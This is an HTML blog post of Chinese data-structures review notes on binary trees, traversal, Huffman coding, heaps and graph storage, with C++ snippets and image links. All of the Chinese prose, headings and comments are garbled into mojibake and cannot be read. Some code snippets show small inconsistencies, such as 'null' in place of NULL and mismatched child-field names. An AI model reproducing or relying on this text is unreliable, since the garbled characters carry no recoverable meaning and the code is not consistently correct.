<h3 id="æ»¡äºŒå‰æ ‘"><a href="#æ»¡äºŒå‰æ ‘" class="headerlink" title="æ»¡äºŒå‰æ ‘"></a>æ»¡äºŒå‰æ ‘</h3><p>æ¯ä¸€å±‚ç»“ç‚¹éƒ½è¾¾åˆ°äº†æœ€å¤§ä¸ªæ•°çš„äºŒå‰æ ‘ã€‚æ·±åº¦ä¸ºkçš„æ»¡äºŒå‰æ ‘æœ‰$2^k-1$ä¸ªã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701211006705.png" alt="image-20200701211006705"></p>
<h3 id="å®Œå…¨äºŒå‰æ ‘"><a href="#å®Œå…¨äºŒå‰æ ‘" class="headerlink" title="å®Œå…¨äºŒå‰æ ‘"></a>å®Œå…¨äºŒå‰æ ‘</h3><p>è‹¥è®¾äºŒå‰æ ‘çš„æ·±åº¦ä¸º kï¼Œåˆ™å…±æœ‰ k å±‚ã€‚é™¤ç¬¬ k å±‚å¤–ï¼Œå…¶å®ƒå„å±‚ (1â€”k-1) çš„ç»“ç‚¹æ•°éƒ½è¾¾åˆ°æœ€å¤§ä¸ªæ•°ï¼Œç¬¬kå±‚ä»<strong>å³å‘å·¦è¿ç»­ç¼ºè‹¥å¹²ç»“ç‚¹</strong>ï¼Œè¿™å°±æ˜¯å®Œå…¨äºŒå‰æ ‘ã€‚<strong>ï¼ˆåŒºåˆ†éå®Œå…¨äºŒå‰æ ‘ï¼‰</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701211039265.png" alt="image-20200701211039265"></p>
<h2 id="äºŒå‰æ ‘çš„å­˜å‚¨è¡¨ç¤º"><a href="#äºŒå‰æ ‘çš„å­˜å‚¨è¡¨ç¤º" class="headerlink" title="äºŒå‰æ ‘çš„å­˜å‚¨è¡¨ç¤º"></a>äºŒå‰æ ‘çš„å­˜å‚¨è¡¨ç¤º</h2><h3 id="é¡ºåºå­˜å‚¨"><a href="#é¡ºåºå­˜å‚¨" class="headerlink" title="é¡ºåºå­˜å‚¨"></a>é¡ºåºå­˜å‚¨</h3><p>å®Œå…¨äºŒå‰æ ‘</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701213812241.png" alt="image-20200701213812241"></p>
<p>éå®Œå…¨äºŒå‰æ ‘</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701213920390.png" alt="image-20200701213920390"></p>
<p>é—®ï¼šé¡ºåºå­˜å‚¨åèƒ½å¦å¤åŸæˆå”¯ä¸€å¯¹åº”çš„äºŒå‰æ ‘å½¢çŠ¶ï¼Ÿ</p>
<p>ç­”ï¼šè‹¥æ˜¯å®Œå…¨/æ»¡äºŒå‰æ ‘åˆ™å¯ä»¥åšåˆ°å”¯ä¸€å¤åŸã€‚ å› ä¸ºæ ¹æ®æ€§è´¨5ï¼šå¯çŸ¥ç»“ç‚¹iï¼Œå·¦å­©å­çš„ä¸‹æ ‡å€¼å¿…ä¸º2iï¼Œ å…¶å³å­©å­çš„ä¸‹æ ‡å€¼å¿…ä¸º2iï¼‹1. éå®Œå…¨äºŒå‰æ ‘è¦å°†å„å±‚ç©ºç¼ºå¤„ç»Ÿç»Ÿè¡¥ä¸Šâ€œè™šç»“ç‚¹â€ï¼Œå…¶å†…å®¹ä¸ºç©ºã€‚</p>
<h3 id="é“¾è¡¨å­˜å‚¨"><a href="#é“¾è¡¨å­˜å‚¨" class="headerlink" title="é“¾è¡¨å­˜å‚¨"></a>é“¾è¡¨å­˜å‚¨</h3><p>äºŒå‰æ ‘ç»“ç‚¹å®šä¹‰ï¼š</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701214456124.png" alt="image-20200701214456124"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200701214613689.png" alt="image-20200701214613689"></p>
<p><strong>å«nä¸ªç»“ç‚¹çš„äºŒå‰é“¾è¡¨å…¶ä¸­ç©ºæŒ‡é’ˆåŸŸä¸ºn+1ä¸ªï¼Œéç©ºæŒ‡é’ˆåŸŸä¸ºn-1ä¸ª</strong>ã€‚</p>
<h2 id="äºŒå‰æ ‘éå†"><a href="#äºŒå‰æ ‘éå†" class="headerlink" title="äºŒå‰æ ‘éå†"></a>äºŒå‰æ ‘éå†</h2><p>==äºŒå‰æ ‘çš„éå†å°±æ˜¯æŒ‰æŸç§æ¬¡åºè®¿é—®æ ‘ä¸­çš„ç»“ç‚¹ï¼Œè¦æ±‚æ¯ä¸ªç»“ç‚¹è®¿é—®ä¸€æ¬¡ä¸”ä»…è®¿é—®ä¸€æ¬¡ã€‚==</p>
<h3 id="äºŒå‰æ ‘éå†çš„é€’å½’ç®—æ³•"><a href="#äºŒå‰æ ‘éå†çš„é€’å½’ç®—æ³•" class="headerlink" title="äºŒå‰æ ‘éå†çš„é€’å½’ç®—æ³•"></a>äºŒå‰æ ‘éå†çš„é€’å½’ç®—æ³•</h3><p>å¯¹æ ¹çš„è®¿é—®æ—¶æœºä¸åŒï¼Œæœ‰ä¸‰ç§å®ç°æ–¹æ¡ˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VLRï¼ˆå‰åºï¼‰</span><br><span class="line">LVRï¼ˆä¸­åºï¼‰</span><br><span class="line">LRVï¼ˆååºï¼‰</span><br></pre></td></tr></table></figure>
<p><strong>å‰åºéå†äºŒå‰æ ‘</strong></p>
<p><strong>è‹¥äºŒå‰æ ‘ä¸ºç©ºï¼Œåˆ™ ç©ºæ“ä½œï¼›å¦åˆ™ (1) è®¿é—®æ ¹ç»“ç‚¹ï¼› (2) å…ˆåºéå†å·¦å­æ ‘ï¼› (3) å…ˆåºéå†å³å­æ ‘ã€‚</strong></p>
<p><strong>ä¸­åºéå†äºŒå‰æ ‘</strong></p>
<p><strong>è‹¥äºŒå‰æ ‘ä¸ºç©ºï¼Œ åˆ™ç©ºæ“ä½œï¼›å¦åˆ™ (1) ä¸­åºéå† å·¦å­æ ‘ï¼› (2) è®¿é—®æ ¹ç»“ç‚¹ï¼› (3) ä¸­åºéå†å³å­æ ‘</strong>ã€‚</p>
<p><strong>ååºéå†äºŒå‰æ ‘</strong></p>
<p><strong>è‹¥äºŒå‰æ ‘ä¸ºç©ºï¼Œåˆ™ ç©ºæ“ä½œï¼›å¦åˆ™ (1) ååºéå† å·¦å­æ ‘ï¼› (2) ååºéå† å³å­æ ‘ï¼› (3) è®¿é—®æ ¹ç»“ç‚¹</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å‰åºéå†</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(T)&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; T-&gt;data &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		preOrder(T-&gt;lchild);</span><br><span class="line">		preOrder(T-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸­åºå’Œååºçœ‹è®¿é—®çš„æ¬¡åº</span></span><br></pre></td></tr></table></figure>
<p><strong>äºŒå‰æ ‘ç®—æ³•è®¾è®¡ç»ƒä¹ </strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//äºŒå‰æ ‘ç®—æ³•è®¾è®¡ç»ƒä¹ </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾è®¡ç®—æ³•æŒ‰å‰åºæ¬¡åºæ‰“å°äºŒå‰æ ‘ä¸­çš„å¶å­ç»“ç‚¹ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrder</span><span class="params">(BiNode *root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;lchild ==<span class="literal">NULL</span> &amp;&amp; root-&gt;rchild==<span class="literal">NULL</span>)</span><br><span class="line">               <span class="built_in">cout</span>&lt;&lt;root-&gt;data;</span><br><span class="line">        PreOrder(root-&gt;lchild);</span><br><span class="line">        PreOrder(root-&gt;rchild);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾è®¡ç®—æ³•æ±‚äºŒå‰æ ‘ä¸­å¶å­ç»“ç‚¹ä¸ªæ•°</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">CountLeaf</span> <span class="params">(BiNode * T)</span></span>&#123;<span class="comment">// å…ˆåºéå†äºŒå‰æ ‘ï¼Œä»¥ count è¿”å›äºŒå‰æ ‘ä¸­å¶å­ç»“ç‚¹æ•° </span></span><br><span class="line">  <span class="keyword">if</span> ( T ==null) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span>  <span class="keyword">if</span> ((!T-&gt;Lchild)&amp;&amp; (!T-&gt;Rchild))<span class="keyword">return</span> <span class="number">1</span>;ã€€ã€€ã€€     </span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">int</span> a=CountLeaf( T-&gt;Lchild);</span><br><span class="line">      <span class="keyword">int</span> b = CountLeaf( T-&gt;Rchild); </span><br><span class="line">                <span class="keyword">return</span> a+b;   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="äºŒå‰æ ‘éå†çš„éé€’å½’ç®—æ³•"><a href="#äºŒå‰æ ‘éå†çš„éé€’å½’ç®—æ³•" class="headerlink" title="äºŒå‰æ ‘éå†çš„éé€’å½’ç®—æ³•"></a>äºŒå‰æ ‘éå†çš„éé€’å½’ç®—æ³•</h3><p><strong>å‰åºéå†</strong></p>
<p><strong>ä¸­åºéå†</strong></p>
<p><strong>å±‚æ¬¡åºéå†</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702162207234.png" alt="image-20200702162207234"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">BinaryTree</span>&lt;T&gt;:</span>:</span><br><span class="line">levelOrder (<span class="keyword">void</span> (*visit) (BinTreeNode&lt;T&gt; *t)) &#123;</span><br><span class="line">     <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">     Queue&lt;BinTreeNode&lt;T&gt; * &gt; Q;</span><br><span class="line">     BinTreeNode&lt;T&gt; *p = root;   </span><br><span class="line">      Q.EnQueue (p); 	</span><br><span class="line">     <span class="keyword">while</span> (!Q.IsEmpty ()) &#123;</span><br><span class="line">          Q.DeQueue (p);</span><br><span class="line">           visit(p);</span><br><span class="line">          <span class="keyword">if</span> (p-&gt;leftChild != <span class="literal">NULL</span>) Q.EnQueue (p-&gt;leftChild);</span><br><span class="line">          <span class="keyword">if</span> (p-&gt;rightChild != <span class="literal">NULL</span>) Q.EnQueue (p-&gt;rightChild);</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure>
<h3 id="äºŒå‰æ ‘çš„è®¡æ•°"><a href="#äºŒå‰æ ‘çš„è®¡æ•°" class="headerlink" title="äºŒå‰æ ‘çš„è®¡æ•°"></a>äºŒå‰æ ‘çš„è®¡æ•°</h3><p>ç”±å…ˆåºåºåˆ—ç¡®å®šæ ¹ç»“ç‚¹ï¼Œå†ç”±ä¸­åºåºåˆ—æ‰¾å‡ºå·¦å³å­æ ‘ï¼Œå¯å”¯ä¸€ç¡®å®šä¸€æ£µäºŒå‰æ ‘ï¼</p>
<h2 id="æ ‘å’Œæ£®æ—"><a href="#æ ‘å’Œæ£®æ—" class="headerlink" title="æ ‘å’Œæ£®æ—"></a>æ ‘å’Œæ£®æ—</h2><p><strong>æ ‘çš„å­˜å‚¨è¡¨ç¤º</strong>ï¼šæ ‘ä¼šè½¬æ¢æˆäºŒå‰æ ‘ï¼Œé€šå¸¸ç”¨å·¦å­å¥³ï¼Œå³å…„å¼Ÿæ¥è¡¨ç¤ºã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702164153548.png" alt="image-20200702164153548"></p>
<h3 id="æ£®æ—å’ŒäºŒå‰æ ‘çš„è½¬æ¢"><a href="#æ£®æ—å’ŒäºŒå‰æ ‘çš„è½¬æ¢" class="headerlink" title="æ£®æ—å’ŒäºŒå‰æ ‘çš„è½¬æ¢"></a>æ£®æ—å’ŒäºŒå‰æ ‘çš„è½¬æ¢</h3><p>æ£®æ—è½¬æ¢ä¸ºäºŒå‰æ ‘ </p>
<ol>
<li>å°†æ£®æ—ä¸­çš„æ¯æ£µæ ‘è½¬æ¢æˆäºŒå‰æ ‘ï¼›</li>
<li>ä»ç¬¬äºŒæ£µäºŒå‰æ ‘å¼€å§‹ï¼Œä¾æ¬¡æŠŠåä¸€æ£µäºŒå‰æ ‘çš„æ ¹ç»“ç‚¹ä½œä¸ºå‰ä¸€æ£µäºŒå‰æ ‘æ ¹ç»“ç‚¹çš„å³å­©å­ï¼Œå½“æ‰€æœ‰äºŒå‰æ ‘è¿èµ·æ¥åï¼Œæ­¤æ—¶æ‰€å¾—åˆ°çš„äºŒå‰æ ‘å°±æ˜¯ç”±æ£®æ—è½¬æ¢å¾—åˆ°çš„äºŒå‰æ ‘ã€‚</li>
</ol>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702174727708.png" alt="image-20200702174727708"></p>
<h2 id="æ ‘ä¸å’Œæ£®æ—çš„éå†"><a href="#æ ‘ä¸å’Œæ£®æ—çš„éå†" class="headerlink" title="æ ‘ä¸å’Œæ£®æ—çš„éå†"></a>æ ‘ä¸å’Œæ£®æ—çš„éå†</h2><h3 id="æ·±åº¦ä¼˜å…ˆéå†"><a href="#æ·±åº¦ä¼˜å…ˆéå†" class="headerlink" title="æ·±åº¦ä¼˜å…ˆéå†"></a>æ·±åº¦ä¼˜å…ˆéå†</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702203721802.png" alt="image-20200702203721802"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702203710965.png" alt="image-20200702203710965"></p>
<p>æ£®æ—å’Œæ ‘ä¸€æ ·ã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702204931378.png" alt="image-20200702204931378"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702204950852.png" alt="image-20200702204950852"></p>
<h3 id="å¹¿åº¦ä¼˜å…ˆéå†"><a href="#å¹¿åº¦ä¼˜å…ˆéå†" class="headerlink" title="å¹¿åº¦ä¼˜å…ˆéå†"></a>å¹¿åº¦ä¼˜å…ˆéå†</h3><p>æ£®æ—çš„å±‚æ¬¡åºéå†ï¼š</p>
<ol>
<li>ä¾æ¬¡éå†å„æ£µæ ‘çš„æ ¹èŠ‚ç‚¹ï¼›</li>
<li>ä¾æ¬¡éå†å„æ£µæ ‘æ ¹èŠ‚ç‚¹çš„æ‰€æœ‰å­å¥³ï¼›</li>
</ol>
<h2 id="å“ˆå¤«æ›¼æ ‘"><a href="#å“ˆå¤«æ›¼æ ‘" class="headerlink" title="å“ˆå¤«æ›¼æ ‘"></a>å“ˆå¤«æ›¼æ ‘</h2><h3 id="è·¯å¾„é•¿åº¦"><a href="#è·¯å¾„é•¿åº¦" class="headerlink" title="è·¯å¾„é•¿åº¦"></a>è·¯å¾„é•¿åº¦</h3><p>è·¯å¾„é•¿åº¦ï¼šä¸¤ä¸ªç»“ç‚¹ä¹‹é—´çš„è·¯å¾„é•¿åº¦ PL æ˜¯è¿æ¥ä¸¤ç»“ç‚¹çš„è·¯å¾„ä¸Šçš„åˆ†æ”¯æ•°ã€‚</p>
<p>æ ‘çš„è·¯å¾„é•¿åº¦ï¼šä»æ ‘æ ¹åˆ°æ¯ä¸€ç»“ç‚¹çš„è·¯å¾„é•¿åº¦ä¹‹å’Œã€‚</p>
<p>æ ‘çš„å¸¦æƒè·¯å¾„é•¿åº¦ï¼šè®¾æ ‘å…·æœ‰nä¸ªå¸¦æƒå€¼çš„å¶å­ç»“ç‚¹ï¼Œä»æ ¹ç»“ç‚¹åˆ°å„ä¸ªå¶å­ç»“ç‚¹çš„è·¯å¾„é•¿åº¦ä¸ç›¸åº”å¶å­ç»“ç‚¹æƒå€¼çš„ä¹˜ç§¯ä¹‹å’Œã€‚ è®°ä¸ºï¼š</p>
<p>$WPL=\sum_{k=1}^nW_kL_k$</p>
<h3 id="å“ˆå¤«æ›¼æ ‘-1"><a href="#å“ˆå¤«æ›¼æ ‘-1" class="headerlink" title="å“ˆå¤«æ›¼æ ‘"></a>å“ˆå¤«æ›¼æ ‘</h3><p><strong>å¸¦æƒè·¯å¾„é•¿åº¦è¾¾åˆ°æœ€å°çš„æ‰©å……äºŒå‰æ ‘ä¸ºå“ˆå¤«æ›¼æ ‘ã€‚</strong></p>
<p>ç‰¹ç‚¹ä¸ºï¼š</p>
<ol>
<li>æƒå€¼è¶Šå¤§çš„å¶å­ç»“ç‚¹è¶Šé è¿‘æ ¹ç»“ç‚¹ï¼Œè€Œæƒå€¼è¶Šå°çš„å¶å­ç»“ç‚¹è¶Šè¿œç¦»æ ¹ç»“ç‚¹ã€‚</li>
<li>åªæœ‰åº¦ä¸º0ï¼ˆå¶å­ç»“ç‚¹ï¼‰å’Œåº¦ä¸º2ï¼ˆåˆ†æ”¯ç»“ç‚¹ï¼‰çš„ç»“ç‚¹ï¼Œä¸å­˜åœ¨åº¦ä¸º1çš„ç»“ç‚¹ã€‚</li>
</ol>
<p><strong>è‹¥å“ˆå¤«æ›¼æ ‘æœ‰nä¸ªå¶èŠ‚ç‚¹ï¼Œåˆ™æ€»ç»“ç‚¹ä¸º2n-1ä¸ªã€‚</strong></p>
<h3 id="å“ˆå¤«æ›¼ç¼–ç "><a href="#å“ˆå¤«æ›¼ç¼–ç " class="headerlink" title="å“ˆå¤«æ›¼ç¼–ç "></a>å“ˆå¤«æ›¼ç¼–ç </h3><p>å“ˆå¤«æ›¼ç¼–ç ç”¨å“ˆå¤«æ›¼ç¼–ç æ ‘æ¥è¡¨ç¤ºï¼ˆå·¦é›¶å³ä¸€ï¼‰ã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702230005801.png" alt="image-20200702230005801"></p>
<p>å“ˆå¤«æ›¼ç¼–ç ç»“æœï¼š$WPL=1bit7+2bit5+3bit6=35bit$</p>
<p>åŸºæœ¬æ€æƒ³ï¼š<strong>æ¦‚ç‡å¤§çš„å­—ç¬¦ç”¨çŸ­ç ï¼Œæ¦‚ç‡å°çš„ç”¨é•¿ç ã€‚</strong></p>
<p>ç»ƒä¹ ï¼šå‡è®¾ç”¨äºé€šä¿¡çš„ç”µæ–‡ä»…ç”±8ä¸ªå­—æ¯ {a, b, c, d, e, f, g, h} æ„æˆï¼Œå®ƒä»¬åœ¨ç”µæ–‡ä¸­å‡ºç°çš„æ¦‚ç‡åˆ†åˆ«ä¸º{ 0.07, 0.19, 0.02, 0.06, 0.32, 0.03, 0.21, 0.10}ï¼Œè¯•ä¸ºè¿™8ä¸ªå­—æ¯è®¾è®¡å“ˆå¤«æ›¼ç¼–ç ã€‚å¦‚æœç”¨0ï½7çš„äºŒè¿›åˆ¶ç¼–ç æ–¹æ¡ˆåˆå¦‚ä½•ï¼Ÿ</p>
<p>ä¸€èˆ¬å·¦é¢æ˜¯å°æ•°ï¼Œå³é¢æ˜¯å¤§æ•°ã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702231339888.png" alt="image-20200702231339888"></p>
<p>$WPLï¼2(0.19+0.32+0.21) + 4(0.07+0.06+0.10) +5(0.02+0.03)<br>                        =1.44+0.92+0.25=2.61 $</p>
<h2 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h2><p><strong>æœ€å°å †ï¼šä»»ä¸€ç»“ç‚¹çš„å…³é”®ç å‡å°äºæˆ–ç­‰äºå®ƒçš„å·¦å³å­å¥³çš„å…³é”®ç ï¼Œä½äºå †é¡¶çš„ç»“ç‚¹çš„å…³é”®ç æ˜¯é›†åˆä¸­æœ€å°çš„ï¼Œæ‰€ä»¥ç§°ä¸ºæœ€å°å †ã€‚</strong></p>
<p><strong>æœ€å°å †çš„å½¢æˆ</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215517930.png" alt="image-20200703215517930"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215541647.png" alt="image-20200703215541647"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215550879.png" alt="image-20200703215550879"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215602757.png" alt="image-20200703215602757"></p>
<h1 id="å›¾"><a href="#å›¾" class="headerlink" title="å›¾"></a>å›¾</h1><h2 id="å›¾çš„åŸºæœ¬æ¦‚å¿µ"><a href="#å›¾çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="å›¾çš„åŸºæœ¬æ¦‚å¿µ"></a>å›¾çš„åŸºæœ¬æ¦‚å¿µ</h2><p>æœ‰å‘å›¾ï¼šå›¾Gä¸­çš„æ¯æ¡è¾¹éƒ½æ˜¯æœ‰æ–¹å‘çš„ï¼›</p>
<p>æ— å‘å›¾ï¼šå›¾Gä¸­çš„æ¯æ¡è¾¹éƒ½æ˜¯æ— æ–¹å‘çš„ï¼›</p>
<p><strong>å®Œå…¨å›¾</strong> ï¼šå›¾Gä»»æ„ä¸¤ä¸ªé¡¶ç‚¹éƒ½æœ‰ä¸€æ¡è¾¹ç›¸è¿æ¥ï¼›<strong>è‹¥æœ‰ n ä¸ªé¡¶ç‚¹çš„æ— å‘å›¾æœ‰ n(n-1)/2 æ¡è¾¹, åˆ™æ­¤å›¾ä¸ºå®Œå…¨æ— å‘å›¾ã€‚</strong><br><strong>æœ‰ n ä¸ªé¡¶ç‚¹çš„æœ‰å‘å›¾æœ‰n(n-1) æ¡è¾¹, åˆ™æ­¤å›¾ä¸ºå®Œå…¨æœ‰å‘å›¾ã€‚</strong></p>
<p><strong>é¡¶ç‚¹çš„åº¦</strong>ï¼šä¸€ä¸ªé¡¶ç‚¹vçš„åº¦æ˜¯ä¸å®ƒç›¸å…³è”çš„è¾¹çš„æ¡æ•°ã€‚</p>
<p>è¿é€šå›¾ä¸è¿é€šåˆ†é‡ ï¼šåœ¨<strong>æ— å‘å›¾</strong>ä¸­, è‹¥ä»é¡¶ç‚¹v1åˆ°é¡¶ç‚¹v2æœ‰è·¯å¾„, åˆ™ç§°é¡¶ç‚¹v1ä¸v2æ˜¯è¿é€šçš„ã€‚å¦‚æœå›¾ä¸­ä»»æ„ä¸€å¯¹é¡¶ç‚¹éƒ½æ˜¯è¿é€šçš„, åˆ™ç§°æ­¤å›¾æ˜¯<strong>è¿é€šå›¾</strong>ã€‚éè¿é€šå›¾çš„æå¤§è¿é€šå­å›¾å«åšè¿é€šåˆ†é‡ã€‚</p>
<p>==è¿™é‡Œè¦åˆ†æ¸…ä¸¤ä¸ªæ¦‚å¿µï¼šæå¤§è¿é€šå­å›¾ï¼ˆè¿é€šåˆ†é‡ï¼‰å’Œæå°è¿é€šå­å›¾ï¼ˆç”Ÿæˆæ ‘ï¼‰==</p>
<p><strong>æå¤§è¿é€šå­å›¾</strong></p>
<ol>
<li>è¿é€šå›¾åªæœ‰ä¸€ä¸ªæå¤§è¿é€šå­å›¾ï¼Œå°±æ˜¯å®ƒæœ¬èº«</li>
<li>éè¿é€šå›¾çš„æå¤§è¿é€šå­å›¾å°±å«è¿é€šåˆ†é‡ï¼Œæ¯ä¸ªåˆ†é‡éƒ½æ˜¯ä¸€ä¸ªè¿é€šå›¾ã€‚</li>
</ol>
<p><strong>æå°è¿é€šå­å›¾</strong></p>
<ol>
<li>ä¸€ä¸ªè¿é€šå›¾çš„ç”Ÿæˆæ ‘å°±æ˜¯æå°è¿é€šå­å›¾ï¼Œå¹¶ä¸”æå°è”é€šå­å›¾åªå­˜åœ¨äº<strong>è¿é€šå›¾ä¸­</strong>ã€‚</li>
<li>æœ€æ˜æ˜¾çš„ç‰¹ç‚¹æ˜¯nä¸ªç»“ç‚¹ï¼Œn-1æ¡è¾¹ã€‚</li>
</ol>
<p>å¼ºè¿é€šå›¾ä¸å¼ºè¿é€šåˆ†é‡ ï¼šåœ¨<strong>æœ‰å‘å›¾</strong>ä¸­, è‹¥å¯¹äºæ¯ä¸€å¯¹é¡¶ç‚¹viå’Œvj, éƒ½å­˜åœ¨ä¸€æ¡ä»viåˆ°vjå’Œä»vjåˆ°viçš„è·¯å¾„, åˆ™ç§°æ­¤å›¾æ˜¯<strong>å¼ºè¿é€šå›¾</strong>ã€‚éå¼ºè¿é€šå›¾çš„æå¤§å¼ºè¿é€šå­å›¾å«åšå¼ºè¿é€šåˆ†é‡ã€‚</p>
<p><strong>ç”Ÿæˆæ ‘  ï¼šä¸€ä¸ªè¿é€šå›¾çš„ç”Ÿæˆæ ‘æ˜¯å…¶æå°è¿é€šå­å›¾ï¼Œåœ¨ n ä¸ªé¡¶ç‚¹çš„æƒ…å½¢ä¸‹ï¼Œæœ‰ n-1 æ¡è¾¹ã€‚</strong></p>
<h2 id="å›¾çš„å­˜å‚¨ç»“æ„"><a href="#å›¾çš„å­˜å‚¨ç»“æ„" class="headerlink" title="å›¾çš„å­˜å‚¨ç»“æ„"></a>å›¾çš„å­˜å‚¨ç»“æ„</h2><h3 id="é‚»æ¥çŸ©é˜µè¡¨ç¤º"><a href="#é‚»æ¥çŸ©é˜µè¡¨ç¤º" class="headerlink" title="é‚»æ¥çŸ©é˜µè¡¨ç¤º"></a>é‚»æ¥çŸ©é˜µè¡¨ç¤º</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004031516.png" alt="image-20200703004031516"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004326822.png" alt="image-20200703004326822"></p>
<p>ç‰¹ç‚¹ï¼šå®Œå…¨å›¾çš„é‚»æ¥çŸ©é˜µä¸­ï¼Œå¯¹è§’å…ƒç´ å…¨ä¸º0ï¼Œå…¶ä½™å…¨ä¸º1ã€‚</p>
<p><strong>ç½‘ç»œçš„é‚»æ¥çŸ©é˜µ</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004532397.png" alt="image-20200703004532397"></p>
<p><strong>é‚»æ¥çŸ©é˜µæ³•ä¼˜ç‚¹ï¼š</strong></p>
<p>å®¹æ˜“å®ç°å›¾çš„æ“ä½œï¼Œå¦‚ï¼šæ±‚æŸé¡¶ç‚¹çš„åº¦ã€åˆ¤æ–­é¡¶ç‚¹ä¹‹é—´æ˜¯å¦æœ‰è¾¹ï¼ˆå¼§ï¼‰ã€æ‰¾é¡¶ç‚¹çš„é‚»æ¥ç‚¹ç­‰ç­‰ã€‚</p>
<p><strong>é‚»æ¥çŸ©é˜µæ³•ç¼ºç‚¹ï¼š</strong></p>
<p>nä¸ªé¡¶ç‚¹éœ€è¦n*nä¸ªå•å…ƒå­˜å‚¨è¾¹(å¼§);ç©ºé—´æ•ˆç‡ä¸ºO(n2)ã€‚ å¯¹ç¨€ç–å›¾è€Œè¨€å°¤å…¶æµªè´¹ç©ºé—´ã€‚</p>
<h3 id="é‚»æ¥è¡¨è¡¨ç¤º"><a href="#é‚»æ¥è¡¨è¡¨ç¤º" class="headerlink" title="é‚»æ¥è¡¨è¡¨ç¤º"></a>é‚»æ¥è¡¨è¡¨ç¤º</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703005244186.png" alt="image-20200703005244186"></p>
